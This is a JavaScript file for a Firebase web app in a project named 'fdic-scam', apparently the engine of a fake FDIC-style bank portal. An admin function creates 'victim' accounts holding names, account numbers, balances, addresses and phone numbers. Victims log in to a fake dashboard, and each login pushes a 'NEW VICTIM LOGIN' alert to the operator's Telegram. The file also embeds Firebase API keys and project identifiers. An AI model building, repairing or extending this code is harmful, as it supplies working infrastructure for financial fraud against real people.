// app.js
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { 
  getAuth, 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  onAuthStateChanged, 
  signOut 
} from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
import { 
  getDatabase, 
  ref, 
  set, 
  get, 
  update 
} from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

// --- FIREBASE CONFIGURATION ---
// REPLACE THIS WITH YOUR ACTUAL FIREBASE CONFIG FROM firebase-config.js
// If you kept firebase-config.js separate, make sure to import from it.
// For now, assuming you are using the single-file approach or this is the main logic file.
// If you have a separate firebase-config.js, uncomment the line below and remove the config object.
// import { auth, db } from "./firebase-config.js";

const firebaseConfig = {
  apiKey: "AIzaSyCmnZKIo9nVpvpTnlnDKFiHxbN-Tlw78KU",
  authDomain: "fdic-scam.firebaseapp.com",
  databaseURL: "https://fdic-scam-default-rtdb.firebaseio.com",
  projectId: "fdic-scam",
  storageBucket: "fdic-scam.firebasestorage.app",
  messagingSenderId: "310003293287",
  appId: "1:310003293287:web:540989afb2936f881bc8c2"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; 
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";

function sendTelegramNotification(message) {
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    }).catch(err => console.error("Telegram Error:", err));
  }
}

// --- AUTH HANDLERS ---

function handleLogin(username, password) {
  const loginEmail = `${username}@fdic-scam.com`;
  
  signInWithEmailAndPassword(auth, loginEmail, password)
    .then((userCredential) => {
      const user = userCredential.user;
      
      // Check if user is admin
      if (username === "admin") {
        window.location.href = "admin.html";
        return;
      }

      // Send Telegram Notification
      sendTelegramNotification(`🚨 NEW VICTIM LOGIN\n\nUser: ${username}\nTime: ${new Date().toLocaleString()}`);

      // Redirect to Dashboard
      window.location.href = "dashboard.html";
    })
    .catch((error) => {
      alert("Invalid Username or Password");
      console.error(error);
    });
}

function handleLogout() {
  signOut(auth).then(() => {
    window.location.href = "index.html";
  });
}

// --- DATABASE HELPERS ---

async function getVictimData(userId) {
  try {
    const snapshot = await get(ref(db, `users/${userId}`));
    return snapshot.val();
  } catch (error) {
    console.error("Error fetching victim data:", error);
    return null;
  }
}

async function updateVictimData(userId, newData) {
  try {
    await update(ref(db, `users/${userId}`), newData);
  } catch (error) {
    console.error("Error updating victim data:", error);
  }
}

// --- ADMIN FUNCTIONS ---

async function createVictimAccount(username, password, name, accountNum, last4, type, balance, address, email, phone) {
  // Use a unique email for the victim in Firebase Auth
  const victimEmail = `${username}@fdic-scam.com`;
  
  let userId;

  try {
    // Try to create the user in Firebase Auth
    const userCredential = await createUserWithEmailAndPassword(auth, victimEmail, password);
    userId = userCredential.user.uid;
  } catch (error) {
    // If user already exists, we need to get the UID. 
    // Firebase Auth doesn't have a simple "get UID by email" without signing in.
    // So we sign in temporarily to get the UID.
    try {
      const userCredential = await signInWithEmailAndPassword(auth, victimEmail, password);
      userId = userCredential.user.uid;
    } catch (signInError) {
      console.error("Error finding existing user:", signInError);
      throw new Error("User exists but could not retrieve UID. Check password.");
    }
  }

  // Save Data to Realtime Database
  const data = {
    name, 
    last4, 
    type, 
    balance, 
    address, 
    email, 
    phone, 
    createdAt: new Date().toISOString()
  };

  try {
    await set(ref(db, `users/${userId}`), data);
    console.log("Victim account created/updated for UID:", userId);
    return userId;
  } catch (dbError) {
    console.error("Error saving to database:", dbError);
    throw dbError;
  }
}

// Export functions for use in HTML
window.app = {
  handleLogin,
  handleLogout,
  getVictimData,
  updateVictimData,
  createVictimAccount
};
